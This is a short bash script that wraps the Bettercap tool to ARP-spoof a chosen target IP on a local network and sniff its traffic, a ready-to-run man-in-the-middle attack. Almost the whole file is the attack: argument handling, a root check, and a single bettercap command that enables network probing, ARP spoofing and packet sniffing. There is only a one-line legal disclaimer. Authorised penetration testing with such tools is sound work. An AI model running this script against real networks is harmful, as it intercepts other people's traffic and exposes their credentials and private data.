#!/usr/bin/env bash
#
# bettercap_mitm.sh
# Launches Bettercap to perform ARP spoofing (MITM) on a specified target IP.
# Usage: ./bettercap_mitm.sh [interface] [target_ip]

INTERFACE="${1}"
TARGET_IP="${2}"

if [[ -z "$INTERFACE" || -z "$TARGET_IP" ]]; then
  echo "[USAGE] ./bettercap_mitm.sh <interface> <target_ip>"
  exit 1
fi

if [[ $EUID -ne 0 ]]; then
  echo "[ERROR] This script must be run as root or with sudo."
  exit 1
fi

echo "[INFO] Starting Bettercap on interface $INTERFACE to target $TARGET_IP ..."
echo
echo "Running commands:"
echo "  net.probe on"
echo "  set arp.spoof.targets $TARGET_IP"
echo "  arp.spoof on"
echo "  net.sniff on"
echo
echo "[LEGAL DISCLAIMER]"
echo "ARP spoofing should only be performed on devices you own or have permission to test."
echo

bettercap -iface "$INTERFACE" -eval "net.probe on; set arp.spoof.targets $TARGET_IP; arp.spoof on; net.sniff on"